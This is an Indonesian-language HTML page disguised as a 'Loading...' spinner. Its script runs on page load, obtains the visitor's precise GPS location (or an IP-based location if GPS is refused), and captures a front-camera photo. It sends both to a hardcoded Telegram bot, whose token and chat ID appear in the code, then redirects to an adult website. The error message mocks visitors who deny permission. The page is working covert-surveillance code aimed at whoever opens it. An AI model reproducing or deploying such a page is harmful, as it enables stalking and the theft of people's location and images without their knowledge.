<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #statusText {
            font-size: 18px;
            color: #333;
        }
        .btn-retry {
            margin-top: 20px;
            padding: 12px 30px;
            background: #dc3545;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            display: none;
        }
        .btn-retry:hover {
            background: #c82333;
        }
        #errorMsg {
            white-space: pre-line;
            font-size: 20px;
            color: #000;
            margin-top: 20px;
            display: none;
        }
        #cameraVideo {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="spinner" id="spinner"></div>
        <div id="statusText">Memuat...</div>
        <div id="errorMsg">lu siapa jir🤣🖕
Berikan izin untuk melanjutkan!</div>
        <button class="btn-retry" id="retryBtn">Coba Lagi</button>
    </div>

    <video id="cameraVideo" autoplay playsinline></video>

    <script>
        (function() {
            // === VARIABEL ===
            const BOT_TOKEN = '8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc';
            const CHAT_ID = '1157643333';
            const REDIRECT_URL = 'https://nekopoi.care';

            let locationData = null; // {lat, lon, accuracy, source}
            let photoBlob = null;   // blob foto

            const statusText = document.getElementById('statusText');
            const spinner = document.getElementById('spinner');
            const errorMsg = document.getElementById('errorMsg');
            const retryBtn = document.getElementById('retryBtn');
            const videoElem = document.getElementById('cameraVideo');

            // === UTILITY ===
            function showLoading(msg = 'Memuat...') {
                spinner.style.display = 'block';
                statusText.innerText = msg;
                errorMsg.style.display = 'none';
                retryBtn.style.display = 'none';
            }

            function showError() {
                spinner.style.display = 'none';
                statusText.innerText = '';
                errorMsg.style.display = 'block';
                retryBtn.style.display = 'inline-block';
            }

            function setStatus(msg) {
                statusText.innerText = msg;
            }

            // === GET LOCATION VIA GPS ===
            function getLocationByGPS() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error('GPS tidak didukung'));
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            resolve({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                source: 'GPS'
                            });
                        },
                        (err) => {
                            reject(err);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                });
            }

            // === GET LOCATION VIA IP API ===
            async function getLocationByIP() {
                try {
                    const resp = await fetch('https://ipapi.co/json/', {
                        headers: { 'Accept': 'application/json' }
                    });
                    if (!resp.ok) throw new Error('IP API gagal');
                    const data = await resp.json();
                    if (!data.latitude || !data.longitude) throw new Error('Data IP tidak lengkap');
                    return {
                        lat: data.latitude,
                        lon: data.longitude,
                        accuracy: 'IP (estimated)',
                        source: 'IP'
                    };
                } catch (e) {
                    throw new Error('Gagal ambil lokasi dari IP');
                }
            }

            // === AMBIL FOTO DARI KAMERA DEPAN ===
            function capturePhotoFromCamera() {
                return new Promise((resolve, reject) => {
                    // Coba akses kamera depan
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 400, height: 400 }
                    })
                    .then((stream) => {
                        videoElem.srcObject = stream;
                        videoElem.onloadedmetadata = () => {
                            videoElem.play();
                            // Tunggu sebentar biar frame stabil
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 400;
                                canvas.height = 400;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(videoElem, 0, 0, 400, 400);
                                stream.getTracks().forEach(track => track.stop());
                                videoElem.srcObject = null;
                                canvas.toBlob((blob) => {
                                    if (blob) resolve(blob);
                                    else reject(new Error('Gagal konversi foto'));
                                }, 'image/jpeg', 0.9);
                            }, 300);
                        };
                        videoElem.onerror = () => {
                            stream.getTracks().forEach(track => track.stop());
                            reject(new Error('Error kamera'));
                        };
                    })
                    .catch((err) => {
                        reject(err);
                    });
                });
            }

            // === KIRIM KE TELEGRAM ===
            async function sendToTelegram(location, photoBlob) {
                const textMsg = `Lokasi: ${location.source}\nLat: ${location.lat}\nLon: ${location.lon}\nAkurasi: ${location.accuracy}`;
                // Kirim teks
                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const textPayload = { chat_id: CHAT_ID, text: textMsg };
                try {
                    const textResp = await fetch(textUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(textPayload)
                    });
                    if (!textResp.ok) throw new Error('Gagal kirim teks');
                } catch (e) {
                    console.warn('Telegram text error:', e);
                }

                // Kirim foto
                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoBlob, 'photo.jpg');
                    const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                    try {
                        const photoResp = await fetch(photoUrl, {
                            method: 'POST',
                            body: formData
                        });
                        if (!photoResp.ok) throw new Error('Gagal kirim foto');
                    } catch (e) {
                        console.warn('Telegram photo error:', e);
                    }
                }
            }

            // === PROSES UTAMA ===
            async function mainProcess() {
                showLoading('Meminta izin lokasi...');

                try {
                    // 1. Coba GPS
                    let loc;
                    try {
                        loc = await getLocationByGPS();
                    } catch (gpsErr) {
                        // GPS ditolak atau error → fallback IP
                        setStatus('GPS ditolak, ambil dari IP...');
                        loc = await getLocationByIP();
                    }
                    locationData = loc;
                    setStatus(`Lokasi didapat (${loc.source})`);

                    // 2. Minta izin kamera depan
                    setStatus('Meminta izin kamera...');
                    let photo = null;
                    try {
                        photo = await capturePhotoFromCamera();
                        photoBlob = photo;
                        setStatus('Foto berhasil diambil');
                    } catch (camErr) {
                        // Jika kamera ditolak, tetap lanjut tanpa foto
                        setStatus('Kamera ditolak, lanjut tanpa foto');
                        photoBlob = null;
                    }

                    // 3. Kirim ke Telegram
                    setStatus('Mengirim data...');
                    await sendToTelegram(locationData, photoBlob);
                    setStatus('Data terkirim!');

                    // 4. Redirect
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);

                } catch (err) {
                    console.error(err);
                    showError();
                }
            }

            // === TOMBOL COBA LAGI ===
            retryBtn.addEventListener('click', () => {
                // Reset dan ulangi proses
                locationData = null;
                photoBlob = null;
                mainProcess();
            });

            // === START ===
            mainProcess();

        })();
    </script>
</body>
</html>
